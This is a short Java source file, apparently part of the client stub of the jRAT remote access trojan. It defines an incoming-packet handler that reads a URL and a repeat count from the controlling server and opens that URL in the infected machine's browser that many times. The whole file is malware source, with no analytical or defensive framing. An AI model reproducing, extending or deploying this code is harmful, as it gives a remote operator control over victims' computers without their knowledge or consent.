package pro.jrat.stub.packets.incoming;

import java.net.URI;

import pro.jrat.stub.Connection;



public class Packet39VisitManyURLs extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		int times = Connection.readInt();
		try {
			for (int i = 0; i < times; i++) {
				java.awt.Desktop.getDesktop().browse(new URI(url));
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
